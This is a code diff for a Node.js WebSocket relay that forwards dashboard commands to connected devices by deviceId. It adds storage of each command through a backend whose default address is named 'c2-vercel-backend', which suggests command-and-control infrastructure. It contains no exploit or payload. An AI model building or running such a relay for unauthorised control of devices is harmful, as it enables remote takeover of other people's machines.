@@ -1,11 +1,12 @@
 // ============================================================
-//  WEBSOCKET RELAY – Modern UI + Real‑time Dashboard
-//  Deploy on Render as a Web Service
+//  WEBSOCKET RELAY – Modern UI + Command Storage
+//  Deploy on Render
 // ============================================================
 
 const express = require('express');
 const WebSocket = require('ws');
 const http = require('http');
+const axios = require('axios');
 
 const app = express();
 app.use(express.json());
@@ -15,6 +16,12 @@ const wss = new WebSocket.Server({ server });
 
 // Store connected clients by deviceId
 const clients = new Map();
+
+// ============================================================
+//  BACKEND URL – Change this to your Vercel backend
+//  You can also set it as environment variable BACKEND_URL
+// ============================================================
+const BACKEND_URL = process.env.BACKEND_URL || 'https://c2-vercel-backend.vercel.app';
 
 // ============================================================
 //  WEBSOCKET CONNECTION HANDLER
@@ -47,9 +54,9 @@ wss.on('connection', (ws, req) => {
 });
 
 // ============================================================
-//  HTTP ENDPOINT – For dashboard to send commands
+//  HTTP ENDPOINT – Receive command from dashboard
 // ============================================================
-app.post('/send-command', (req, res) => {
+app.post('/send-command', async (req, res) => {
     const { deviceId, command } = req.body;
 
     if (!deviceId || !command) {
@@ -59,8 +66,20 @@ app.post('/send-command', (req, res) => {
         });
     }
 
-    const ws = clients.get(deviceId);
+    // 1. Store command in Supabase via Vercel backend
+    try {
+        await axios.post(`${BACKEND_URL}/api/send-command`, {
+            deviceId: deviceId,
+            command: command
+        });
+        console.log(`[Relay] ✅ Command stored in backend for ${deviceId}`);
+    } catch (e) {
+        console.error(`[Relay] ❌ Failed to store command: ${e.message}`);
+        // Continue anyway – the command may still be delivered via WebSocket
+    }
 
+    // 2. Send command via WebSocket (if device is connected)
+    const ws = clients.get(deviceId);
     if (!ws || ws.readyState !== WebSocket.OPEN) {
         return res.status(404).json({
             success: false,
@@ -71,7 +90,10 @@ app.post('/send-command', (req, res) => {
     try {
         ws.send(JSON.stringify({ command }));
         console.log(`[Relay] 📤 Command sent to ${deviceId}: ${command}`);
-        res.json({ success: true, message: 'Command sent' });
+        res.json({
+            success: true,
+            message: 'Command sent via WebSocket'
+        });
     } catch (e) {
         res.status(500).json({
             success: false,
@@ -81,7 +103,7 @@ app.post('/send-command', (req, res) => {
 });
 
 // ============================================================
-//  HEALTH CHECK (JSON)
+//  HEALTH CHECK
 // ============================================================
 app.get('/health', (req, res) => {
     res.json({
@@ -92,7 +114,7 @@ app.get('/health', (req, res) => {
 });
 
 // ============================================================
-//  ROOT – MODERN UI DASHBOARD (fixed template literals)
+//  ROOT – MODERN UI (Glassmorphism)
 // ============================================================
 app.get('/', (req, res) => {
     res.send(`
@@ -572,6 +594,7 @@ app.get('/', (req, res) => {
 const PORT = process.env.PORT || 8080;
 server.listen(PORT, () => {
     console.log(`[Relay] 🚀 Server running on port ${PORT}`);
-    console.log(`[Relay] 🔗 WebSocket endpoint: ws://localhost:${PORT}?deviceId=xxx`);
+    console.log(`[Relay] 🔗 Backend URL: ${BACKEND_URL}`);
+    console.log(`[Relay] 📡 WebSocket endpoint: ws://localhost:${PORT}?deviceId=xxx`);
     console.log(`[Relay] 📡 HTTP endpoint: http://localhost:${PORT}/send-command`);
 });
